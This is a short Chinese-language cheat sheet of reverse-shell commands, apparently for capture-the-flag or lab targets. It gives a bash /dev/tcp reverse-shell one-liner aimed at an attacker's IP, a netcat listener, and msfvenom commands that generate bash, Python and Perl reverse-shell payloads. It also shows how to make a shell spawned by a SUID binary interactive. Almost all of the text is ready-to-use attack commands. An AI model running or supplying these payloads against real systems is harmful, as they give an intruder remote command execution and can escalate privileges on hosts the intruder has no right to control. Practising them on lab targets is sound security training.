反弹shell常用命令：
/bin/bash -i >& /dev/tcp/<自己主机ip>/<监听端口> 0>&1
nc -lvnp <监听端口>

不想记忆的话直接用msf生成也可以：
常见的基于 `cmd/unix/reverse_` 开头的完整有效反弹shell载荷选项及用法如下：

 1. `cmd/unix/reverse_bash`
用于生成在 Unix 系统上通过 Bash 实现反向 shell 的命令。

msfvenom -p cmd/unix/reverse_bash LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -f raw

- `LHOST`：指定攻击机的 IP 地址。
- `LPORT`：指定攻击机监听的端口。
- `-f raw`：以原始文本格式输出生成的命令。

示例：

msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.100 LPORT=4444 -f raw


 2. `cmd/unix/reverse_python`
生成通过 Python 实现反向 shell 的命令，在有 Python 环境的 Unix 系统上使用。

msfvenom -p cmd/unix/reverse_python LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -f raw

示例：

msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.100 LPORT=4444 -f raw


 3. `cmd/unix/reverse_perl`
生成使用 Perl 实现反向 shell 的命令，适用于有 Perl 环境的 Unix 系统。

msfvenom -p cmd/unix/reverse_perl LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -f raw

示例：

msfvenom -p cmd/unix/reverse_perl LHOST=192.168.1.100 LPORT=4444 -f raw


靶机中给出了一个suid文件，他可以执行/bin/sh，但返回的是一个非交互式的终端，此时如何使其返回交互终端：
方法 1：0<&1 1>&0 2>&0

./suid_shell 0<&1 1>&0 2>&0

    0<&1：把标准输入（fd 0）指向当前的标准输出（fd 1，也就是你的终端）。

    1>&0：把标准输出（fd 1）指向标准输入（fd 0）。

    2>&0：把标准错误（fd 2）也指向标准输入（fd 0）。

合在一起，就是让子进程的所有输入输出都回到你当前的终端。
方法 2：直接指向 /dev/tty

./suid_shell < /dev/tty > /dev/tty 2>&1

    < /dev/tty：用你的终端做 stdin。

    > /dev/tty：用你的终端做 stdout。

    2>&1：stderr 重定向到 stdout。
 
